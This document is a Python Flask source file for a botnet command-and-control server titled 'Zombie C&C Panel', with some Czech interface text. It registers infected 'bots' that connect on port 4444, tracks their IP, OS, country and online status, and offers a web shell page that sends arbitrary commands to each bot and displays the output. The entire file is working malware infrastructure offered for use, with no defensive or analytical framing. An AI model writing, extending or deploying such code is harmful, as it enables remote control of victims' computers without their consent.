import os
import socket
import threading
import pickle
import platform
import time
from flask import Flask, render_template_string, request, jsonify, redirect
from datetime import datetime, timedelta
import geocoder

app = Flask(__name__)
SOCKET_PORT = 4444
HTTP_PORT = 80
BOT_TIMEOUT_HOURS = 13
PICKLE_FILE = 'bots.pkl'
bots = {}
shell_sessions = {}

# HTML TEMPLATE
TEMPLATE = '''
<!DOCTYPE html>
<html>
<head>
    <title>Zombie C&C Panel</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #1e1e1e; color: white; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #444; padding: 10px; text-align: center; }
        th { background-color: #333; }
        .online { color: lime; }
        .offline { color: red; }
        a { color: orange; text-decoration: none; }
        .header { font-size: 24px; margin-top: 20px; }
        .command-box { width: 100%; padding: 10px; background: #2e2e2e; color: white; border: none; }
        .response-box { white-space: pre-wrap; background-color: #111; padding: 10px; margin-top: 10px; border: 1px solid #333; height: 300px; overflow-y: scroll; }
    </style>
    <script>
        async function sendCommand(bot_id) {
            const cmd = document.getElementById('command').value;
            const res = await fetch(`/send-command/${bot_id}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ cmd })
            });
            const data = await res.json();
            document.getElementById('response').textContent = data.output;
        }
    </script>
</head>
<body>
    {% if shell %}
        <h2>Shell Control for Bot {{ bot_id }}</h2>
        <input id="command" class="command-box" placeholder="Zadej příkaz..."><button onclick="sendCommand('{{ bot_id }}')">Spustit</button>
        <div id="response" class="response-box"></div>
    {% else %}
        <div class="header">Zombies Online: {{ online_count }}</div>
        <table>
            <tr><th>ID</th><th>Status</th><th>IP</th><th>OS</th><th>Shell</th><th>Country</th></tr>
            {% for bot_id, bot in bots.items() %}
            <tr>
                <td>{{ bot_id }}</td>
                <td class="{{ 'online' if bot['online'] else 'offline' }}">{{ 'Online' if bot['online'] else 'Offline' }}</td>
                <td>{{ bot['ip'] }}</td>
                <td>{{ bot['os'] }}</td>
                <td><a href="/shell-id={{ bot_id }}">🕹️</a></td>
                <td>{{ bot['country'] }}</td>
            </tr>
            {% endfor %}
        </table>
    {% endif %}
</body>
</html>
'''

def save_bots():
    with open(PICKLE_FILE, 'wb') as f:
        pickle.dump(bots, f)

def load_bots():
    global bots
    if os.path.exists(PICKLE_FILE):
        with open(PICKLE_FILE, 'rb') as f:
            bots = pickle.load(f)

def update_bot(bot_id, ip, os_name):
    country = geocoder.ip(ip).country or "Unknown"
    bots[bot_id] = {
        'ip': ip,
        'os': os_name,
        'last_seen': datetime.now(),
        'country': country,
        'online': True,
        'session': None
    }
    save_bots()

def mark_offline():
    while True:
        now = datetime.now()
        for bot in bots.values():
            if now - bot['last_seen'] > timedelta(hours=BOT_TIMEOUT_HOURS):
                bot['online'] = False
        save_bots()
        time.sleep(300)

@app.route('/')
def index():
    online_count = sum(1 for b in bots.values() if b['online'])
    return render_template_string(TEMPLATE, bots=bots, online_count=online_count, shell=False)

@app.route('/shell-id=<bot_id>')
def shell(bot_id):
    return render_template_string(TEMPLATE, bot_id=bot_id, shell=True, bots=bots, online_count=0)

@app.route('/send-command/<bot_id>', methods=['POST'])
def send_command(bot_id):
    cmd = request.json['cmd']
    try:
        bot = bots[bot_id]
        ip = bot['ip']
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, 4444))
        s.sendall(cmd.encode())
        data = s.recv(65536).decode(errors='ignore')
        s.close()
        return jsonify({"output": data})
    except Exception as e:
        return jsonify({"output": f"[Chyba] {str(e)}"})

@app.route('/session')
def session():
    return redirect('/')

# Socket server

def socket_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', SOCKET_PORT))
    s.listen(5)
    print(f"[SOCKET] Listening on port {SOCKET_PORT}...")

    while True:
        client, addr = s.accept()
        ip = addr[0]
        try:
            os_name = client.recv(1024).decode()
            found = False
            for bid, bot in bots.items():
                if bot['ip'] == ip:
                    update_bot(bid, ip, os_name)
                    found = True
                    break
            if not found:
                bot_id = str(len(bots) + 1)
                update_bot(bot_id, ip, os_name)
            client.close()
        except Exception as e:
            print(f"[ERROR] Failed to register bot: {e}")

if __name__ == '__main__':
    load_bots()
    threading.Thread(target=socket_server, daemon=True).start()
    threading.Thread(target=mark_offline, daemon=True).start()
    app.run(host='0.0.0.0', port=HTTP_PORT)
